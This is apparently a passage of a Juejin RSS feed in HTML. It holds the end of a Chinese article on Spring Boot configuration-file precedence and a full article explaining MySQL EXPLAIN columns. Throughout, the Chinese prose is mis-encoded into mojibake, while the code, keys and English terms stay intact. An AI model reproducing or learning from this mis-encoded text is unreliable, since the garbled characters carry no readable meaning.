  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>             <span class="hljs-comment"># é»˜è®¤ç«¯å£</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">my-app</span>         <span class="hljs-comment"># åº”ç”¨å</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost/dev_db</span> <span class="hljs-comment"># å¼€å‘åº“</span>
</code></pre>
<h4 data-id="heading-6">2. å±‚çº§ä¸­ç­‰ï¼šJar åŒ…åŒçº§ç›®å½• (<code>./application.yml</code>)</h4>
<p>è¿ç»´éƒ¨ç½²æ—¶æ”¾çš„ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9000</span>             <span class="hljs-comment"># ã€å†²çªã€‘æƒ³æ”¹æˆ 9000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.1.1/prod_db</span> <span class="hljs-comment"># ã€å†²çªã€‘æ”¹æˆç”Ÿäº§åº“</span>
</code></pre>
<h4 data-id="heading-7">3. å±‚çº§æœ€é«˜ï¼šConfig å­ç›®å½• (<code>./config/application.yml</code>)</h4>
<p>ä¸ºäº†ç‰¹æ®Šè°ƒè¯•ï¼ŒåˆåŠ äº†ä¸€ä¸ªï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>             <span class="hljs-comment"># ã€å†²çªã€‘è¿™é‡Œçº§åˆ«æœ€é«˜ï¼</span>
<span class="hljs-attr">logging:</span>
  <span class="hljs-attr">level:</span> <span class="hljs-string">debug</span>           <span class="hljs-comment"># ã€æ–°å¢ã€‘è¿™é‡Œç‹¬æœ‰çš„é…ç½®</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ğŸ’¥ æœ€ç»ˆåˆå¹¶ç»“æœï¼ˆç¨‹åºå®é™…è¿è¡Œé…ç½®ï¼‰</h3>
<p>å½“è¿è¡Œ <code>java -jar app.jar</code> æ—¶ï¼Œæœ€ç»ˆç”Ÿæ•ˆçš„é…ç½®å¦‚ä¸‹ï¼š</p>






























<table><thead><tr><th align="left">é…ç½®é¡¹ (Key)</th><th align="left">æœ€ç»ˆå€¼</th><th align="left">æ¥æºä¸åŸå› </th></tr></thead><tbody><tr><td align="left"><code>server.port</code></td><td align="left"><strong>9999</strong></td><td align="left"><strong>configç›®å½•</strong> (æœ€é«˜ä¼˜) è¦†ç›–äº† jaråŒ…æ— å’Œ jaråŒ…å†… çš„é…ç½®ã€‚</td></tr><tr><td align="left"><code>spring.datasource.url</code></td><td align="left"><strong>.../prod_db</strong></td><td align="left"><strong>jaråŒ…æ—ç›®å½•</strong> (ä¸­ä¼˜) è¦†ç›–äº† jaråŒ…å†… çš„é…ç½®ï¼Œconfigç›®å½•æ²¡å†™ï¼Œæ‰€ä»¥â€œé€â€ä¸‹æ¥äº†ã€‚</td></tr><tr><td align="left"><code>spring.application.name</code></td><td align="left"><strong>my-app</strong></td><td align="left"><strong>jaråŒ…å†…éƒ¨</strong> (ä¿åº•)ã€‚å¤–éƒ¨ä¸¤ä¸ªæ–‡ä»¶éƒ½æ²¡å†™è¿™ä¸ªé…ç½®ï¼Œæ²¿ç”¨é»˜è®¤å€¼ã€‚</td></tr><tr><td align="left"><code>logging.level</code></td><td align="left"><strong>debug</strong></td><td align="left"><strong>configç›®å½•</strong> (æ–°å¢)ã€‚è¿™æ˜¯ä¸€ä¸ªå…¨æ–°çš„é…ç½®ï¼Œè¢«åˆå¹¶è¿›æ¥äº†ã€‚</td></tr></tbody></table>
<h2 data-id="heading-9">äº”ã€ æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>ä¸è¦è¯•å›¾åœ¨å¤–éƒ¨é‡å†™æ‰€æœ‰é…ç½®</strong>ï¼šåˆ©ç”¨â€œäº’è¡¥åˆå¹¶â€ç‰¹æ€§ï¼Œå¤–éƒ¨é…ç½®æ–‡ä»¶ï¼ˆ<code>application.yml</code>ï¼‰åº”è¯¥<strong>åªåŒ…å«éœ€è¦ä¿®æ”¹çš„å·®å¼‚åŒ–é…ç½®</strong>ï¼ˆå¦‚æ•°æ®åº“å¯†ç ã€ç«¯å£ã€IPï¼‰ã€‚è®©é‚£äº›é€šç”¨çš„é…ç½®ï¼ˆå¦‚ Jackson æ ¼å¼åŒ–ã€çº¿ç¨‹æ± é»˜è®¤è®¾ç½®ï¼‰ç•™åœ¨ Jar åŒ…é‡Œä½œä¸ºä¿åº•ã€‚</li>
<li><strong>ç›®å½•ç»“æ„å»ºè®®</strong>ï¼š
<ul>
<li>å¦‚æœæ˜¯ç®€å•çš„å•æœºéƒ¨ç½²ï¼Œç›´æ¥æŠŠ <code>application.yml</code> æ”¾åœ¨ Jar åŒ…æ—è¾¹å³å¯ã€‚</li>
<li>å¦‚æœä½ å¸Œæœ›ç›®å½•æ›´æ•´æ´ï¼Œæˆ–è€…æœ‰å¤šä¸ªè¾…åŠ©é…ç½®æ–‡ä»¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ª <code>config</code> æ–‡ä»¶å¤¹å­˜æ”¾ã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ çš„SQLä¸ºä»€ä¹ˆæ…¢ï¼Ÿçœ‹æ‡‚MySQL EXPLAINæ‰§è¡Œè®¡åˆ’ï¼Œå¿«é€Ÿå®šä½æ€§èƒ½ç“¶é¢ˆ]]></title>    <link>https://juejin.cn/post/7592768559169929242</link>    <guid>https://juejin.cn/post/7592768559169929242</guid>    <pubDate>2026-01-08T08:23:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592768559169929242" data-draft-id="7592816646869549065" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ çš„SQLä¸ºä»€ä¹ˆæ…¢ï¼Ÿçœ‹æ‡‚MySQL EXPLAINæ‰§è¡Œè®¡åˆ’ï¼Œå¿«é€Ÿå®šä½æ€§èƒ½ç“¶é¢ˆ"/> <meta itemprop="keywords" content="æ•°æ®åº“,MySQL"/> <meta itemprop="datePublished" content="2026-01-08T08:23:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CVå·¥ç¨‹å¸ˆçš„è‡ªæˆ‘ä¿®å…»"/> <meta itemprop="url" content="https://juejin.cn/user/1039488093258619"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ çš„SQLä¸ºä»€ä¹ˆæ…¢ï¼Ÿçœ‹æ‡‚MySQL EXPLAINæ‰§è¡Œè®¡åˆ’ï¼Œå¿«é€Ÿå®šä½æ€§èƒ½ç“¶é¢ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039488093258619/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CVå·¥ç¨‹å¸ˆçš„è‡ªæˆ‘ä¿®å…»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:23:31.000Z" title="Thu Jan 08 2026 08:23:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“ä¸€æ¡SQLæ…¢çš„æ—¶å€™éœ€è¦åˆ†æå…·ä½“åŸå› ï¼ŒåŸºæœ¬ç¬¬ä¸€ååº”å°±æ˜¯ç¥­å‡º<code>EXPLAIN</code>å‘½ä»¤å»è§£æè¿™æ¡SQLæ‰§è¡Œæƒ…å†µã€‚ä½†æ˜¯å¤§å¤šæ•°äººéƒ½åªä¼šçœ‹æ˜¯å¦å‘½ä¸­ç´¢å¼•ä»¥åŠå¯¹è¡¨çš„è®¿é—®ç±»å‹ã€‚æ˜¯å¦çœ‹åˆ°<code>Extra</code>é‡Œçš„<code>Using filesort</code>ã€<code>Using temporary</code>åªçŸ¥é“æ˜¯è­¦å‘Šï¼Œå´ä¸çŸ¥å¦‚ä½•è§£å†³ï¼Ÿä¸‹é¢å°±å¸¦ä½ è¯¦ç»†åˆ†æ<code>EXPLAIN</code>è§£é‡Šç»“æœçš„æ¯ä¸€åˆ—éƒ½åˆ†åˆ«ä»£è¡¨ç€ä»€ä¹ˆæ„æ€ã€‚</p>
<p><strong>id</strong></p>
<p>selectè¯­å¥çš„æ‰§è¡Œåºå·ï¼Œæ‰§è¡Œé¡ºåºä¸ºä»å¤§åˆ°å°æ‰§è¡Œï¼Œå¦‚æœç›¸åŒæ—¶ä»ä¸Šå¾€ä¸‹æ‰§è¡Œã€‚</p>
<p><strong>select_type</strong></p>
<ol>
<li>SIMPLEï¼šç®€å•çš„selectï¼Œä¸ä½¿ç”¨UNIONæˆ–è€…å­æŸ¥è¯¢ç­‰ï¼›</li>
<li>PRIMARYï¼šå­æŸ¥è¯¢ä¸­æœ€å¤–å±‚æŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä¸­è‹¥åŒ…å«ä»»ä½•å¤æ‚çš„å­éƒ¨åˆ†ï¼Œæœ€å¤–å±‚çš„selectè¢«æ ‡è®°ä¸ºPRIMARYï¼›</li>
<li>UNIONï¼šUNIONä¸­çš„ç¬¬äºŒä¸ªæˆ–è€…åé¢çš„selectè¯­å¥ï¼›</li>
<li>DEPENDENT UNIONï¼šUNIONä¸­çš„ç¬¬äºŒä¸ªæˆ–è€…åé¢çš„selectè¯­å¥ï¼Œå–å†³äºå¤–é¢çš„æŸ¥è¯¢ï¼›</li>
<li>UNION RESULTï¼šUNIONçš„ç»“æœï¼›</li>
<li>SUBQUERYï¼šå­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ªselectï¼Œç»“æœä¸ä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢ï¼›</li>
<li>DEPENDENT SUBQUERYï¼šå­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ªselectï¼Œç»“æœä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢ï¼›</li>
<li>DERIVEDï¼šæ´¾ç”Ÿè¡¨çš„selectï¼Œfromè‡ªå±…çš„å­æŸ¥è¯¢ï¼›</li>
<li>UNCACHEABLEã€€SUBQUERYï¼šä¸€ä¸ªå­æŸ¥è¯¢çš„ç»“æœä¸èƒ½è¢«ç¼“å­˜ï¼Œå¿…é¡»é‡æ–°è¯„ä¼°å¤–è¿æ¥é¥¿ç¬¬ä¸€è¡Œ</li>
</ol>
<p><strong>table</strong></p>
<p>æ˜¾ç¤ºè¿™ä¸€æ­¥æ‰€è®¿é—®æ•°æ®åº“ä¸­è¡¨åç§°(æ˜¾ç¤ºè¿™ä¸€è¡Œçš„æ•°æ®æ˜¯å…³äºå“ªå¼ è¡¨çš„)ï¼Œæœ‰æ—¶ä¸æ˜¯çœŸå®çš„è¡¨åç§°ï¼Œå¯èƒ½æ˜¯åˆ«åï¼Œä¹Ÿå¯èƒ½æ˜¯ç¬¬å‡ æ­¥æ‰§è¡Œçš„ç»“æœçš„ç®€ç§°</p>
<p><strong>type</strong></p>
<p>å¯¹è¡¨çš„è®¿é—®æ–¹å¼ï¼Œè¡¨ç¤ºMySQLåœ¨è¡¨ä¸­æ‰¾åˆ°æ‰€éœ€è¡Œçš„æ–¹å¼ï¼Œåˆç§°â€œè®¿é—®ç±»å‹â€ã€‚</p>
<ol>
<li>ALL:å…¨è¡¨æ‰«æï¼Œæ€§èƒ½æœ€å·®ï¼Œå¦‚æœåœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨äº†limit</li>
<li>index:è·ŸALLä¸€æ ·ï¼Œä¹Ÿä¼šè¿›è¡Œå…¨è¡¨æ‰«æï¼Œåªæ˜¯MySQLä¼šæŒ‰ç´¢å¼•æ¬¡åºè¿›è¡Œå…¨è¡¨æ‰«æï¼Œè€Œä¸æ˜¯ç›´æ¥æ‰«æè¡Œæ•°æ®ã€‚å®ƒä¸»è¦çš„ä¼˜ç‚¹æ˜¯é¿å…äº†æ’åºï¼›æœ€å¤§çš„ç¼ºç‚¹æ˜¯è¦æ‰¿æ‹…æŒ‰ç´¢å¼•æ¬¡åºè¯»å–æ•´ä¸ªè¡¨çš„å¼€é”€ã€‚è‹¥æ˜¯æŒ‰éšæœºæ¬¡åºè®¿é—®è¡Œï¼Œå¼€é”€å°†ä¼šéå¸¸å¤§ã€‚</li>
<li>range:èŒƒå›´æ‰«æï¼Œå°±æ˜¯ä¸€ä¸ªæœ‰èŒƒå›´é™åˆ¶çš„ç´¢å¼•æ‰«æã€‚å®ƒå¼€å§‹äºç´¢å¼•é‡Œçš„æŸä¸€ç‚¹ï¼Œè¿”å›æ‰¹åŒ¹é…è¿™ä¸ªèŒƒå›´å€¼çš„è¡Œã€‚rangeæ¯”å…¨ç´¢å¼•æ‰«ææ›´é«˜æ•ˆï¼Œå› ä¸ºå®ƒç”¨ä¸ç€éå†å…¨éƒ¨ç´¢å¼•ã€‚</li>
<li>ref:æ ‡è¯†ä¸Šè¿°è¡¨çš„è¿æ¥åŒ¹é…æ¡ä»¶ï¼Œå³å“ªäº›åˆ—æˆ–å¸¸é‡è¢«ç”¨äºæŸ¥æ‰¾ç´¢å¼•åˆ—å•†å¾—å€¼ã€‚</li>
<li>eq_ref:ç±»ä¼¼refï¼ŒåŒºåˆ«å°±åœ¨ä½¿ç”¨çš„ç´¢å¼•æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œå¯¹äºæ¯ä¸ªç´¢å¼•é”®å€¼ï¼Œè¡¨ä¸­åªæœ‰ä¸€æ¡è®°å½•åŒ¹é…ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šè¡¨è¿æ¥ä¸­ä½¿ç”¨primary_keyæˆ–è€…unique_keyä½œä¸ºå…³è”æ¡ä»¶ã€‚</li>
<li>constã€system:å½“MySQLå¯¹æŸ¥è¯¢æŸéƒ¨åˆ†è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶è½¬æ¢ä¸ºä¸€ä¸ªå¸¸é‡æ—¶ï¼Œä½¿ç”¨è¿™äº›ç±»å‹è®¿é—®ã€‚ä¾‹å¦‚ä¸»é”®è‡³äºwhereåˆ—è¡¨ä¸­ï¼Œmysqlå°±èƒ½å°†è¯¥æŸ¥è¯¢è½¬æ¢ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œsystemæ˜¯constç±»å‹çš„ç‰¹ä¾‹ï¼Œå½“æŸ¥è¯¢çš„è¡¨åªæœ‰ä¸€è¡Œçš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨systemã€‚</li>
<li>null:MySQLåœ¨ä¼˜åŒ–è¿‡ç¨‹ä¸­åˆ†è§£è¯­å¥ï¼Œæ‰§è¡Œæ—¶ç”šè‡³ä¸ç”¨è®¿é—®è¡¨æˆ–è€…ç´¢å¼•ï¼Œä¾‹å¦‚ä»ä¸€ä¸ªç´¢å¼•åˆ—é‡Œé€‰å–æœ€å°å€¼å¯ä»¥é€šè¿‡å•ç‹¬ç´¢å¼•æŸ¥æ‰¾å®Œæˆã€‚</li>
</ol>
<p><strong>possible_keys</strong></p>
<p>æŒ‡å‡ºMySQLèƒ½ä½¿ç”¨å“ªä¸ªç´¢å¼•åœ¨è¡¨ä¸­æ‰¾åˆ°è®°å½•ï¼ŒæŸ¥è¯¢æ¶‰åŠåˆ°çš„å­—æ®µä¸Šè‹¥å­˜åœ¨ç´¢å¼•ï¼Œåˆ™è¯¥ç´¢å¼•å°†è¢«åˆ—å‡ºï¼Œä½†ä¸ä¸€å®šè¢«æŸ¥è¯¢ä½¿ç”¨(è¯¥æŸ¥è¯¢å¯ä»¥åˆ©ç”¨ç´¢å¼•ï¼Œå¦‚æœæ²¡æœ‰ä»»ä½•ç´¢å¼•æ˜¾ç¤ºnull)è¯¥åˆ—å®Œå…¨ç‹¬ç«‹äºexplainè¾“å‡ºæ‰€ç¤ºçš„è¡¨çš„æ¬¡åºã€‚è¿™æ„å‘³ç€åœ¨possible_keysä¸­çš„æŸäº›é”®å®é™…ä¸Šä¸èƒ½æŒ‰ç”Ÿæˆçš„è¡¨æ¬¡åºä½¿ç”¨ï¼Œå¦‚æœè¯¥åˆ—æ˜¯nullï¼Œåˆ™æ²¡æœ‰ç›¸å…³çš„ç´¢å¼•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥whereè‡ªå±…çœ‹æ˜¯å¦å®ƒå¼•ç”¨æŸäº›åˆ—æˆ–è€…é€‚åˆç´¢å¼•çš„åˆ—æ¥æé«˜ä½ çš„æŸ¥è¯¢æ€§èƒ½ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œåˆ›é€ ä¸€ä¸ªé€‚å½“çš„ç´¢å¼•å¹¶ä¸”å†æ¬¡ç”¨explainæ£€æŸ¥æŸ¥è¯¢ã€‚</p>
<p><strong>key</strong></p>
<p>keyåˆ—æ˜¾ç¤ºMySQLå®é™…å†³å®šä½¿ç”¨çš„é”®ï¼ˆç´¢å¼•ï¼‰ï¼Œå¿…ç„¶åŒ…å«åœ¨possible_keysä¸­å¦‚æœæ²¡æœ‰é€‰æ‹©ç´¢å¼•ï¼Œé”®æ˜¯NULLã€‚è¦æƒ³å¼ºåˆ¶MySQL ä½¿ç”¨æˆ–å¿½è§†possible_keysåˆ—ä¸­çš„ç´¢å¼•ï¼Œåœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨FORCE INDEXã€USE INDEXæˆ–è€…IGNORE INDEXã€‚</p>
<p><strong>key_len</strong></p>
<p>è¡¨ç¤ºç´¢å¼•ä¸­ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼Œå¯é€šè¿‡è¯¥åˆ—è®¡ç®—æŸ¥è¯¢ä¸­ä½¿ç”¨çš„ç´¢å¼•çš„é•¿åº¦ï¼ˆkey_lenæ˜¾ç¤ºçš„å€¼ä¸ºç´¢å¼•å­—æ®µçš„æœ€å¤§å¯èƒ½é•¿åº¦ï¼Œå¹¶éå®é™…ä½¿ç”¨é•¿åº¦ï¼Œå³key_lenæ˜¯æ ¹æ®è¡¨å®šä¹‰è®¡ç®—è€Œå¾—ï¼Œä¸æ˜¯é€šè¿‡è¡¨å†…æ£€ç´¢å‡ºçš„ï¼‰ä¸æŸå¤±ç²¾ç¡®æ€§çš„æƒ…å†µä¸‹ï¼Œé•¿åº¦è¶ŠçŸ­è¶Šå¥½</p>
<p><strong>ref</strong></p>
<p>åˆ—ä¸ç´¢å¼•çš„æ¯”è¾ƒï¼Œè¡¨ç¤ºä¸Šè¿°è¡¨çš„è¿æ¥åŒ¹é…æ¡ä»¶ï¼Œå³å“ªäº›åˆ—æˆ–å¸¸é‡è¢«ç”¨äºæŸ¥æ‰¾ç´¢å¼•åˆ—ä¸Šçš„å€¼</p>
<p><strong>rows</strong></p>
<p>ä¼°ç®—å‡ºç»“æœé›†è¡Œæ•°ï¼Œè¡¨ç¤ºMySQLæ ¹æ®è¡¨ç»Ÿè®¡ä¿¡æ¯åŠç´¢å¼•é€‰ç”¨æƒ…å†µï¼Œä¼°ç®—çš„æ‰¾åˆ°æ‰€éœ€çš„è®°å½•æ‰€éœ€è¦è¯»å–çš„è¡Œæ•°</p>
<p><strong>extra</strong></p>
<p>è¯¥åˆ—åŒ…å«MySQLè§£å†³æŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯,ä¸‹é¢è¯¦ç»†ã€‚</p>
<ol>
<li>Distinct:ä¸€æ—¦MYSQLæ‰¾åˆ°äº†ä¸è¡Œç›¸è”åˆåŒ¹é…çš„è¡Œï¼Œå°±ä¸å†æœç´¢äº†ã€‚</li>
<li>Not exists:MYSQLä¼˜åŒ–äº†LEFT JOINï¼Œä¸€æ—¦å®ƒæ‰¾åˆ°äº†åŒ¹é…LEFT JOINæ ‡å‡†çš„è¡Œï¼Œå°±ä¸å†æœç´¢äº†</li>
<li>Range checked for each:Recordï¼ˆindex map:#ï¼‰æ²¡æœ‰æ‰¾åˆ°ç†æƒ³çš„ç´¢å¼•ï¼Œå› æ­¤å¯¹äºä»å‰é¢è¡¨ä¸­æ¥çš„æ¯ä¸€ä¸ªè¡Œç»„åˆï¼ŒMYSQLæ£€æŸ¥ä½¿ç”¨å“ªä¸ªç´¢å¼•ï¼Œå¹¶ ç”¨å®ƒæ¥ä»è¡¨ä¸­è¿”å›è¡Œã€‚è¿™æ˜¯ä½¿ç”¨ç´¢å¼•çš„æœ€æ…¢çš„è¿æ¥ä¹‹ä¸€</li>
<li>Using filesort:çœ‹åˆ°è¿™ä¸ªçš„æ—¶å€™ï¼ŒæŸ¥è¯¢å°±éœ€è¦ä¼˜åŒ–äº†ã€‚MYSQLéœ€è¦è¿›è¡Œé¢å¤–çš„æ­¥éª¤æ¥å‘ç°å¦‚ä½•å¯¹è¿”å›çš„è¡Œæ’åºã€‚å®ƒæ ¹æ®è¿æ¥ç±»å‹ä»¥åŠå­˜å‚¨æ’åºé”® å€¼å’ŒåŒ¹é…æ¡ä»¶çš„å…¨éƒ¨è¡Œçš„è¡ŒæŒ‡é’ˆæ¥æ’åºå…¨éƒ¨è¡Œ</li>
<li>Using index:åˆ—æ•°æ®æ˜¯ä»ä»…ä»…ä½¿ç”¨äº†ç´¢å¼•ä¸­çš„ä¿¡æ¯è€Œæ²¡æœ‰è¯»å–å®é™…çš„è¡ŒåŠ¨çš„è¡¨è¿”å›çš„ï¼Œè¿™å‘ç”Ÿåœ¨å¯¹è¡¨çš„å…¨éƒ¨çš„è¯·æ±‚åˆ—éƒ½æ˜¯åŒä¸€ä¸ªç´¢å¼•çš„éƒ¨åˆ†çš„æ—¶å€™</li>
<li>Using temporary:çœ‹åˆ°è¿™ä¸ªçš„æ—¶å€™ï¼ŒæŸ¥è¯¢éœ€è¦ä¼˜åŒ–äº†ã€‚è¿™é‡Œï¼ŒMYSQLéœ€è¦åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨æ¥å­˜å‚¨ç»“æœï¼Œè¿™é€šå¸¸å‘ç”Ÿåœ¨å¯¹ä¸åŒçš„åˆ—é›†è¿›è¡ŒORDER BY ä¸Šï¼Œè€Œä¸æ˜¯GROUP BYä¸Š</li>
<li>Using where:ä½¿ç”¨äº†WHEREä»å¥æ¥é™åˆ¶å“ªäº›è¡Œå°†ä¸ä¸‹ä¸€å¼ è¡¨åŒ¹é…æˆ–è€…æ˜¯è¿”å›ç»™ç”¨æˆ·ã€‚å¦‚æœä¸æƒ³è¿”å›è¡¨ä¸­çš„å…¨éƒ¨è¡Œï¼Œå¹¶ä¸”è¿æ¥ç±»å‹ALLæˆ–indexï¼Œè¿™ å°±ä¼šå‘ç”Ÿï¼Œæˆ–è€…æ˜¯æŸ¥è¯¢æœ‰é—®é¢˜</li>
</ol>
<p><strong>æ³¨æ„</strong></p>
<ol>
<li>EXPLAINä¸ä¼šå‘Šè¯‰ä½ å…³äºè§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„ä¿¡æ¯æˆ–ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯¹æŸ¥è¯¢çš„å½±å“æƒ…å†µ</li>
<li>EXPLAINä¸èƒ½æ˜¾ç¤ºMySQLåœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶æ‰€ä½œçš„ä¼˜åŒ–å·¥ä½œ</li>
